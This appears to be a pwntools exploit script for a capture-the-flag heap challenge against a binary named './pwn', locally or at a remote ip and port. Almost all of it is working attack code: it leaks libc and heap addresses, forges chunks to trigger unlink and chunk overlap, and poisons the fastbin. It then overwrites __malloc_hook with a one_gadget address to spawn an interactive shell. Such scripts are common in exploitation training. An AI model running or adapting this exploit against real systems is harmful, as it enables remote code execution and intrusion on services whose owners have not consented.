from pwn import *
ru=lambda s:p.recvuntil(s)
rl=lambda :p.recvline()
sl=lambda s:p.sendline(s)
sd=lambda s:p.send(s)
rn=lambda n:p.recvn(n)

def run(ip=None,port=None):
    global p,is_debug
    if libpath and binarypath:
        p=process(binarypath,env={'LD_PRELOAD':libpath})
    elif ip and port:
        is_debug=False
        p=remote(ip,port)
    else:
        p=process(binarypath)

def debugf(s=''):
    if is_debug:
        gdb.attach(p,s)

def menu(i):
    ru('choice: ')
    sl(str(i))
def add(i,size,con='a'):
    menu(1)
    ru('index: ')
    sl(str(i))
    ru('size: ')
    sl(str(size))
    if con:
        ru('info: ')
        sd(con)
def show(i):
    menu(2)
    ru('index: ')
    sl(str(i))
def delete(i):
    menu(3)
    ru('index: ')
    sl(str(i))

def exp(ip=None,port=None):
    run(ip=ip,port=port)
    add(0,0x80)
    add(1,0x80)
    delete(0)
    add(0,0x80)
    show(0)
    libc_addr=u64(rn(8))
    libc_base=libc_addr-0x3c4b61
    delete(0)
    delete(1)
    add(0,0x30)
    add(1,0x30)
    delete(0)
    delete(1)
    add(0,0x30)
    show(0)
    heap_base=u64(rn(8))-0x61
    delete(0)
    add(0,0x400)
    delete(0)

    pay={
        0x28:p64(0x41),
        0x30:p64(heap_base+0x30)*2,
        0x60:p64(0x40)
    }
    add(0,0x68,fit(pay,filler='\xff'))
    add(1,0xf0)
    
    add(2,heap_base+0x78+1,'a')
    delete(0)
    delete(1)

    # heap 2
    
    add(0,0x60,'\xff'*0x60)
    add(1,0x60,'\xff'*0x60)
    delete(0)
    delete(1)
    add(0,0x60,'\x00')           # 0
    show(0)
    heap2=u64(rn(8))+0xb0
    add(1,0x60)
    delete(0)
    delete(1)
    add(0,0x400)
    delete(0)


    payload={
        0x1a0-0xc0+0x8: p64(0x105),
        0x1b0-0xc0:p64(heap2+0xf0)*2,
        0xaa0-0x8c0:p64(0x100)
    }
    add(0,0x1e0,fit(payload,filler='\x00'))
    add(1,0xf0)
    delete(0)
     
    # add(2,heap2+0x78+1)                              # 2
    # can over write prev size
    add(2,heap2+0x1f0+1)
    print(hex(heap2))
    debugf('nb {}\nnb {}'.format(hex(0xEED),hex(0xD45))) 
    delete(1)               # unlink
    payload={
        0x68:p64(0x25),
        0x68+0x20:p64(0x25),
        0x68+0x20+0x20:p64(0x25)
    }
    add(0,0x300,fit(payload,filler='\xff'))
    payload={
        0xe8:p64(0x75)
    }
    add(1,0x1e0,fit(payload,filler='\xff'))
    delete(0)
    delete(1)
    

    malloc_hook=libc_base+0x3c4b10
    payload={
        0xe8:p64(0x75),
        0xf0:p64(malloc_hook-0x23)
    }
    add(0,0x1e0,fit(payload,filler='\xff'))
    add(1,0x60)
    
    one_off=0x45216
    one_off=0x4526a
    one_off=0xf02a4
    one_off=0xf1147
    one=libc_base+one_off
    add(2,0x60,'\x00'*0x13+p64(one))
    delete(0)

    delete(1)
    add(1,0xf0,'')

    print(hex(heap2))
    p.interactive()

context(log_level='debug',os='linux',arch='amd64')
# context(log_level='debug',os='linux',arch='i386')
context.aslr=True
p=None
libpath=None
binarypath=['./pwn']
is_debug=True
exp()
